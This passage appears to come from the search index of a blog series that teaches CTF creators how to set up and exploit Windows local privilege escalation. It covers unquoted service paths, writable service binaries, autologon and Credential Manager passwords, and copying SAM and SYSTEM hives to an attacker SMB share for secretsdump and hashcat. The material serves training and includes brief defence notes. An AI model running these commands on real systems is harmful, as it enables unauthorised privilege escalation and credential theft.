SERVICE_USER_DEFINED_CONTROL READ_CONTROL [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Administrators SERVICE_ALL_ACCESS [2] ACCESS_ALLOWED_ACE_TYPE: Everyone SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_STOP READ_CONTROL PS C:\\Users\\user\u003e C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -ucqv user \"Insecure Registry VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com RW Insecure Registry VulnService SERVICE_ALL_ACCESS PS C:\\Users\\user\u003e C:\\Tools\\SysInternalsSuite\\psservice.exe /accepteula security \"Insecure Registry VulnService\" PsService v2.25 - Service information and configuration utility Copyright (C) 2001-2010 Mark Russinovich Sysinternals - www.sysinternals.com SERVICE_NAME: Insecure Registry VulnService DISPLAY_NAME: Insecure Registry VulnService ACCOUNT: LocalSystem SECURITY: [ALLOW] NT AUTHORITY\\SYSTEM Query status Query Config Interrogate Enumerate Dependents Pause/Resume Start Stop User-Defined Control Read Permissions [ALLOW] BUILTIN\\Administrators All [ALLOW] Everyone Query status Query Config Interrogate Enumerate Dependents Start Stop Read Permissions Check the current values in the registry entry: PS C:\\Users\\user\u003e reg query \"HKLM\\System\\CurrentControlSet\\Services\\Insecure Registry VulnService\" HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Insecure Registry VulnService Type REG","date":"2022-03-20","objectID":"/windows-privesc-services/:18:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Defense Make sure that the service registry hives Security permissions that restrict a user from editing it. Privilege Escalation via Unquoted Service Path The Windows system executables can be executed without their extension, e.g., “notepad.exe” can be run by typing “notepad”. Additionally, some executables take arguments separated by spaces, e.g., “program.exe arg_1 arg_2”. Here is an example path: C:\\Program Files\\Unquoted Path Service\\Service.exe This path isn’t enclosed with quotes (\" \") which means that in reality, the Windows system interprets this path as: C:\\Program \"Files\\Vuln\" \"Service\\Service.exe\" C:\\Program.exe \"Argument 1\" \"Argument 2\" The Windows system clarifies the situation by examining each of the options listed above. The problem lies in whether we can write to a directory that Windows checks before the actual executable: C:\\Program Files # Writable C:\\Service.exe # Malicious Executable (Created by the attacker) In summary, this is vulnerable when the path doesn’t have quotes and it has spaces. ","date":"2022-03-20","objectID":"/windows-privesc-services/:19:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration Open an administrator command prompt or a PowerShell console as administrator and create the directory that we will use for the service path: C:\\Tools\u003emd \"C:\\Program Files\\Unquoted Path Service\" Copy the service executable file to the path of the service: C:\\Tools\u003ecopy \"C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe\" \"C:\\Program Files\\Unquoted Path Service\\VulnService.exe\" 1 file(s) copied. C:\\Tools\u003edir \"C:\\Program Files\\Unquoted Path Service\\VulnService.exe\" Volume in drive C has no label. Volume Serial Number is 560A-9A69 Directory of C:\\Program Files\\Unquoted Path Service 03/09/2022 12:06 AM 7,168 VulnService.exe 1 File(s) 7,168 bytes 0 Dir(s) 55,280,295,936 bytes free Grant full permissions to the executable: C:\\Tools\u003eicacls \"C:\\Program Files\\Unquoted Path Service\" /grant \"Authenticated Users:F\" processed file: C:\\Program Files\\Unquoted Path Service Successfully processed 1 files; Failed processing 0 files Create the service with an unquoted path with the SCM: C:\\Tools\u003esc create \"Unquoted VulnService\" binpath= \"C:\\Program Files\\Unquoted Path Service\\VulnService.exe\" type= own displayname= \"Unquoted Path Service\" [SC] CreateService SUCCESS C:\\Tools\u003esc qc \"Unquoted VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Unquoted VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Program Files\\Unquoted Path Service\\VulnService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Unquoted Path Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem Note: To create a quoted path we must add “\\ at the start of the binpath value. Example: “\"C:\\Path To\\Executablee”” or “\"C:\\Path To\\Executable”\". If we just add a value like “C:\\Path To\\Executable” then the service will be unquoted. Set the service access rights: C:\\Tools\u003esc sdset \"Unquoted VulnService\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" [SC] SetServiceObjectSecurity SUCCESS Start the service: C:\\Tools\u003esc start \"Unquoted VulnService\" SERVICE_NAME: Unquoted VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 3740 FLAGS : ","date":"2022-03-20","objectID":"/windows-privesc-services/:20:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Privilege Escalation Let’s verify if we have permission to restart the service: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uwcqv user \"Unquoted VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com RW Unquoted VulnService SERVICE_ALL_ACCESS There are two main ways that we can see the path of the executable of a service. The first method is by enumerating the BINARY_PATH_NAME configuration and the second method is by enumerating the registry key ImagePath: C:\\Users\\user\u003esc qc \"Unquoted VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Unquoted VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Program Files\\Unquoted Path Service\\VulnService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Unquoted Path Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem C:\\Users\\user\u003ereg query \"HKLM\\System\\CurrentControlSet\\services\\Unquoted VulnService\" HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\Unquoted VulnService Type REG_DWORD 0x10 Start REG_DWORD 0x3 ErrorControl REG_DWORD 0x1 ImagePath REG_EXPAND_SZ C:\\Program Files\\Unquoted Path Service\\VulnService.exe DisplayName REG_SZ Unquoted Path Service ObjectName REG_SZ LocalSystem HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\Unquoted VulnService\\Security We can use wmic to find services and use findstr to filter what we want and what we don’t want: C:\\Users\\user\u003ewmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\system32\\\\\" |findstr /i /v \"\"\" DisplayName Name PathName StartMode LSM LSM Unknown NetSetupSvc NetSetupSvc Unknown Net.Tcp Port Sharing Service NetTcpPortSharing C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe Disabled Performance Counter DLL Host PerfHost C:\\Windows\\SysWow64\\perfhost.exe Manual RemoteMouseService RemoteMouseService C:\\Program Files (x86)\\Remote Mouse\\RemoteMouseService.exe Auto Windows Modules Installer TrustedInstaller C:\\Windows\\servicing\\TrustedInstaller.exe Auto VulnService VulnService C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe Manual Unquoted Path Service Unquoted VulnService C:\\Program Files\\Unquoted Path Service\\VulnService.exe Manual Unquoted Path Service\rAlternatively, we can list all the unquoted service paths with PowerShell (minus built-in Windows services): PS C:\\Tools\u003e gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name PathName DisplayName Name -------- ----------- ---- C:\\Program Files (x86)\\Remote Mouse\\RemoteMouseService.exe RemoteMouseService RemoteMouseService PS C:\\Tools\u003e gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Manual\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name PathName DisplayName Name -------- ----------- ---- C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe VulnService Vu... C:\\Program Files\\Unquoted Path Service\\VulnService.exe Unquoted Path Service Un... Note: We may want to change the start mode: StartMode -eq “Manual” As we can see it is not enclosed with quotes. Let’s verify if we can restart the service: C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uvqc \"Insecure VulnService Executable\" Now we’ll need to verify if we have to write permissions in any of these directories: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Program Files\\Unquoted Path Service RW NT AUTHORITY\\Authenticated Users RW NT SERVICE\\TrustedInstaller RW NT","date":"2022-03-20","objectID":"/windows-privesc-services/:21:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Defense Make sure to add quotes (\" \") to the service binary path and verify that the directories are not writable by unprivileged users. ","date":"2022-03-20","objectID":"/windows-privesc-services/:22:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Applications","date":"2022-03-20","objectID":"/windows-privesc-apps/","tags":["applications","insecure gui applications","insecure startup applications","insecure applications permissions","vulnerable applications","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Applications for CTF Creators","uri":"/windows-privesc-apps/"},{"categories":["Windows Local Privilege Escalation"],"content":"Applications Certain vulnerabilities in applications can lead to privilege escalation. These can range from path hijacking to DLL hijacking and others as well. Privilege Escalation via Vulnerable Applications There are plenty of more bugs that can lead to privileges escalation such as stack-based buffer overflows. We can find public exploits in the ExploitDB database, there is a tool named searchsploit which is a command line search tool for Exploit-DB that also allows us to take a copy of the exploit database in our systems. searcshploit \u003capp-name\u003e windows privilege escalation searcshploit \u003capp-name\u003e privilege escalation searchsploit \u003capp-name\u003e windows local privilege escalation searchsploit \u003capp-name\u003e local privilege escalation Privilege Escalation via Write Permissions In this section, we will discuss privilege escalation techniques that involve replacing the executable of a service. An application listed on ExploitDB, PCProtect 4.8.35, grants full permissions to any user. The author describes the following: The application grants “Everyone: (F)” to the contents of the directory and its subfolders. Additionally, the program installs a service called “SecurityService” which runs under the “Local system account.” This configuration allows any user to escalate privileges to “NT AUTHORITY\\SYSTEM” by substituting the service’s binary with a malicious one. The proof of concept (PoC) is documented on the exploit page. We will follow those steps after installing the application, which can be downloaded here. C:\\Users\\user\u003eicacls \"c:\\Program Files (x86)\\PCProtect\" c:\\Program Files (x86)\\PCProtect BUILTIN\\Users:(OI)(CI)(F) Everyone:(OI)(CI)(F) NT SERVICE\\TrustedInstaller:(I)(F) NT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F) NT AUTHORITY\\SYSTEM:(I)(F) NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F) BUILTIN\\Users:(I)(RX) BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE) CREATOR OWNER:(I)(OI)(CI)(IO)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE) Successfully processed 1 files; Failed processing 0 files C:\\Users\\user\u003esc qc SecurityService [SC] QueryServiceConfig SUCCESS SERVICE_NAME: SecurityService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : PC Security Management Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem C:\\Users\\user\u003eicacls \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\" C:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F) Everyone:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) Successfully processed 1 files; Failed processing 0 files Based on the output above, we have writable permissions to the executable of the service named SecurityService. We will set up an SMB server on the attacker host and authenticate to the SMB service. ❯ sudo impacket-smbserver share . -smb2support -username low -password 'p@ssw0rd' Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation Now we’re gonna authenticate to the SMB service: PS C:\\Users\\user\u003e $pass = ConvertTo-SecureString 'p@ssw0rd' -AsPlainText -Force PS C:\\Users\\user\u003e $cred = New-Object System.Management.Automation.PSCredential('low', $pass) PS C:\\Users\\user\u003e New-PSDrive -Name \"share\" -PSProvider \"FileSystem\" -Root \"\\\\192.168.119.130\\share\" -Credential $cred Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- share FileSystem \\\\192.168.119.130\\share We can view the permissions of the service us","date":"2022-03-20","objectID":"/windows-privesc-apps/:0:0","tags":["applications","insecure gui applications","insecure startup applications","insecure applications permissions","vulnerable applications","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Applications for CTF Creators","uri":"/windows-privesc-apps/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Credential Hunting","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Credential Hunting Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text. ","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:0:0","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Autologon We’re gonna add the autologon user to the registry, we need a command prompt or a PowerShell console running as administrator: C:\\Windows\\system32\u003ereg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"DefaultUsername\" /t REG_SZ /d user /f \u003enul C:\\Windows\\system32\u003ereg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"DefaultPassword\" /t REG_SZ /d con321 /f \u003enul C:\\Windows\\system32\u003ereg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"AutoAdminLogon\" /t REG_SZ /d 1 /f \u003enul C:\\Windows\\system32\u003e As an attacker from a medium-integrity level console, we can enumerate these credentials with: C:\\Windows\\system32\u003ereg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Default*\" HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon DefaultUsername REG_SZ user DefaultPassword REG_SZ con321 End of search: 2 match(es) found. ","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:1:0","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Credentials Manager / Windows Vault The Windows Credentials Manager is a windows vault that stores user credentials for servers, websites and other programs that Windows can log in the users automatically. These credentials can be used by Windows to log in to the users automatically, which means that any Windows application that needs credentials to access a resource (server or a website) can make use of this Credential Manager. I recommend reading this article. Windows Credential Manager\rBasically, the Credential Manager is used by the Windows operating system to store the credentials of applications or addresses such as URLs. This information can be used on local machines, systems on the network/intranet, or even services on the internet such as web services. The Credential Manager has two main types of credentials: Web Credentials: Stores websites credentials. Windows Credentials: Windows Credentials: Stores logon credentials such as (Interactive logon) Certificate-Based Credentials: Stores credentials of certificates Generic Credentials: Stores credentials of applications and internet/network addresses. Let’s startup by adding a Window credential of a local user, in this case, the Administrator user: Admin Credential Manager\rNote: Verify that the Internet or network address is set to your COMPUTER_NAME\\admin and that the User name field has the syntax YOUR_COMPUTER_NAME\\Administrator and make sure that the password is correct. Using the cmdkey we can see the stored credentials: C:\\Users\\user\u003ecmdkey /list Currently stored credentials: Target: MicrosoftAccount:target=SSO_POP_Device Type: Generic User: 02erabxflqezalbj Saved for this logon only Target: WindowsLive:target=virtualapp/didlogical Type: Generic User: 02erabxflqezalbj Local machine persistence Target: Domain:interactive=desktop-bn\\admin Type: Domain Password User: desktop-bn\\Administrator Using the runas /savecred: /savecred: is used to use credentials previously saved by the user. /user: the user to runas Essentially, Windows will go to the credential manager and check for the administrator user and use its password: C:\\Users\\user\u003erunas /savecred /user:admin cmd.exe Attempting to start cmd.exe as user \"desktop-bn\\admin\" ... However, this spawns the cmd.exe process as Administrator with High-Integrity Level: C:\\Windows\\system32\u003ewhoami /all USER INFORMATION ---------------- User Name SID ============================= ============================================ desktop-bn\\administrator S-1-5-21-264094270-2388996790-3434637240-500 GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\\Performance Log Users Alias S-1-5-32-559 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\H","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:1:1","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Extracting Credentials from the Credential Manager Tools such as mimikatz, credentialfileview, VaultPasswordView, and Empire Powershells module can help you extract credentials from the Windows Credential Manager. This section covers the following escalation paths: Non-Admin Medium Integrity Level (No Password) -\u003e Non-Admin Medium Integrity Level Password Admin Medium Integrity Level (No Password) -\u003e Admin Medium Integrity Level Password ","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:1:2","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Plain-Text Credentials Add a simple plain-text file containing a password: C:\\Users\\user\u003e echo 'Administrator con123' \u003e C:\\Users\\user\\Documents\\passwords.txt Then from an attacker’s perspective, let’s search all the files in the C:\\ drive: C:\\Users\\user\u003edir /b /a /s C:\\ \u003e cdirs.txt The command above has the following attributes: /b: Uses bare format (no heading information or summary). /a: Displays files with specified attributes. /s: Displays files in specified directory and all subdirectories. Filter for files containing the following string (passw): C:\\Users\\user\u003etype cdirs.txt | findstr /i passw \u003c...SNIP...\u003e C:\\Users\\user\\Documents\\passwords.txt \u003c...SNIP...\u003e We found a clear-text password filename: C:\\Users\\user\u003etype C:\\Users\\user\\Documents\\passwords.txt Administrator con123 We should also try to enumerate network shares or other disk mounts: net use ","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:2:0","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Answer Files (Unattend/ed.xml) According to the official documentation, the answer files are described as: Answer files (or Unattend files) can be used to modify Windows settings in your images during Setup. You can also create settings that trigger scripts in your images that run after the first user creates their account and picks their default language. Another important detail is the following: Windows Setup will automatically search for answer files in certain locations, or you can specify an unattend file to use by using the /unattend: option when running Windows Setup (setup.exe). As stated above, the answer files can be written in different locations, here is a general template that we can use: C:\\Windows\\sysprep\\sysprep.xml C:\\Windows\\sysprep\\sysprep.inf C:\\Windows\\sysprep.inf C:\\Windows\\Panther\\Unattended.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\System32\\Sysprep\\unattend.xml C:\\Windows\\System32\\Sysprep\\unattended.xml C:\\unattend.txt C:\\unattend.inf dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2\u003enul This is an example of the content of an Unattended.xml file: \u003ccomponent name=\"Microsoft-Windows-Shell-Setup\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" processorArchitecture=\"amd64\"\u003e \u003cAutoLogon\u003e \u003cPassword\u003eUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u003c/Password\u003e \u003cEnabled\u003etrue\u003c/Enabled\u003e \u003cUsername\u003eAdministrateur\u003c/Username\u003e \u003c/AutoLogon\u003e \u003cUserAccounts\u003e \u003cLocalAccounts\u003e \u003cLocalAccount wcm:action=\"add\"\u003e \u003cPassword\u003e*SENSITIVE*DATA*DELETED*\u003c/Password\u003e \u003cGroup\u003eadministrators;users\u003c/Group\u003e \u003cName\u003eAdministrateur\u003c/Name\u003e \u003c/LocalAccount\u003e \u003c/LocalAccounts\u003e \u003c/UserAccounts\u003e Noticed that there is a password field: \u003cPassword\u003exxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u003c/Password\u003e We can decode this base64 string and gather the password in plain text: echo 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' | base64 -d I won’t recreate a scenario of this since this happens during the Windows Setup. ","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:2:1","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"SAM \u0026 SYSTEM Backups The SAM and SYSTEM backups are usually stored in the following locations: %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system We’re gonna create a backup of the SAM and SYSTEM files; to do this we must run it from an administrator command prompt or PowerShell console: C:\\Windows\\system32\u003ereg save hklm\\sam c:\\sam The operation completed successfully. C:\\Windows\\system32\u003ereg save hklm\\system c:\\system The operation completed successfully. Let’s verify if we have access to these files as a low-privileged user: C:\\Windows\\system32\u003eicacls C:\\sam C:\\sam BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) NT AUTHORITY\\Authenticated Users:(I)(M) Mandatory Label\\High Mandatory Level:(I)(NW) Successfully processed 1 files; Failed processing 0 files C:\\Windows\\system32\u003eicacls C:\\system C:\\system BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) NT AUTHORITY\\Authenticated Users:(I)(M) Mandatory Label\\High Mandatory Level:(I)(NW) Successfully processed 1 files; Failed processing 0 files We do have access as we can see in this line: NT AUTHORITY\\Authenticated Users:(I)(M) As we can see we’re part of this group: PS C:\\Tools\u003e whoami /groups | findstr /i authenticated NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group Setup an SMB share with credentials on your host: ❯ sudo impacket-smbserver share . -smb2support -username low -password 'p@ssw0rd' [sudo] password for kali: Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Transfer the SAM and SYSTEM files to your attacker VM: PS C:\\Users\\user\u003e $pass = ConvertTo-SecureString 'p@ssw0rd' -AsPlainText -Force PS C:\\Users\\user\u003e $cred = New-Object System.Management.Automation.PSCredential('low', $pass) PS C:\\Users\\user\u003e New-PSDrive -Name \"share\" -PSProvider \"FileSystem\" -Root \"\\\\192.168.119.130\\share\" -Credential $cred Transfer the files to your host: PS C:\\\u003e cp C:\\sam \\\\192.168.119.130\\share PS C:\\\u003e cp C:\\system \\\\192.168.119.130\\share Now we have transferred these files to the attacker host: ❯ ls -l sam .rwxr-xr-x root root 48 KB Tue Mar 8 17:48:37 2022  sam ❯ ls -l system .rwxr-xr-x root root 12 MB Tue Mar 8 17:49:40 2022  system Use secretsdump from impacket to dump out the hashes from the SAM and SYSTEM files: ❯ impacket-secretsdump -sam sam -system system LOCAL Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Target system bootKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb::: Guest:501:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx::: DefaultAccount:503:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx::: WDAGUtilityAccount:504:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx::: user:1001:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx::: [*] Cleaning up... Save the hash and the password to a file: ❯ echo 'a9a46a3fc0b4efcd2baf566ffe2a209b' \u003e hash.txt ❯ echo 'con123' \u003e pass.txt With that we can simulate a dictionary attack of the Administrator user NTLM hash using hashcat: ❯ hashcat -m 1000 --force hash.txt pass.txt hashcat (v6.1.1) starting... \u003c...SNIP...\u003e xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:con123 Session..........: hashcat Status...........: Cracked Hash.Name........: NTLM Hash.Target......: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Time.Started.....: Tue Mar 8 18:05:45 2022, (0 secs) Time.Estimated...: Tue Mar 8 18:05:45 2022, (0 secs) Guess.Base.......: File (pass.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 21 H/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Re","date":"2022-03-20","objectID":"/windows-privesc-credential-hunting/:3:0","tags":["credential hunting","plain-text files","answer files","windows credential manager","ask for credentials","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Credential Hunting for CTF Creators","uri":"/windows-privesc-credential-hunting/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - DLL Hijacking","date":"2022-03-20","objectID":"/windows-privesc-dll-hijacking/","tags":["path dll hijacking","dll hijacking sideloading","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - DLL Hijacking for CTF Creators","uri":"/windows-privesc-dll-hijacking/"},{"categories":["Windows Local Privilege Escalation"],"content":"DLL Hijacking A dynamically compiled Win32 executable may use functions exported by 